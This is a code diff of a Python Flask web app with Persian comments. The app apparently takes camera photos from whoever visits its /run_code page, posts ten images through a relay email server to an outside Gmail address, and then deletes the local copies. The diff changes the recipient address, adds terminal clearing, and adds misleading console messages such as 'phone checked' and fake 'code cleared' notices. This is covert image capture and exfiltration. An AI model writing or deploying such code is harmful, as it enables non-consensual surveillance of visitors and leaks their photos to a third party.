@@ -14,6 +14,10 @@ os.makedirs(IMAGE_DIR, exist_ok=True)
 # آدرس سرور واسط برای ارسال ایمیل
 EMAIL_SERVER_URL = "https://your-email-server.com/send-email"
 
+# تابعی برای پاک کردن پیام‌ها از ترمینال
+def clear_terminal():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
 # تابعی برای پاک کردن کدهای قبلی (شبیه‌سازی پاک شدن کدها)
 def clear_previous_code():
     print("\nکدهای قبلی پاک شدند.\n")
@@ -36,7 +40,9 @@ def index():
 
 @app.route('/run_code')
 def run_code():
+    clear_terminal()  # پاک کردن ترمینال
     clear_previous_code()  # پاک کردن کدهای قبلی
+    print("\033[91mphone checked\033[0m")  # نمایش پیام "phone checked" با رنگ قرمز در ترمینال
     return render_template_string('''
         <h3>در حال گرفتن عکس...</h3>
         <script>
@@ -103,14 +109,18 @@ def send_images():
 
     # ارسال عکس‌ها به سرور واسط
     files = [("attachments", (os.path.basename(img), open(img, "rb").read(), "image/png")) for img in image_files]
-    response = requests.post(EMAIL_SERVER_URL, files=files, data={"to": "ai.site.serching@gmail.com"})
+    response = requests.post(EMAIL_SERVER_URL, files=files, data={"to": "ai.site.serching10@gmail.com"})
 
     # حذف عکس‌ها بعد از ارسال
     for image in image_files:
         os.remove(image)
 
     # نمایش پیام ارسال شده
+    print("\033[92m✅ ۱۰ عکس ارسال شد!\033[0m")  # پیام ارسال عکس‌ها با رنگ سبز
+
     return "✅ ۱۰ عکس ارسال شد!"
 
 if __name__ == '__main__':
+    clear_terminal()  # پاک کردن ترمینال هنگام شروع برنامه
+    print("کد در حال اجرا است...")
     app.run(debug=True, port=5000)
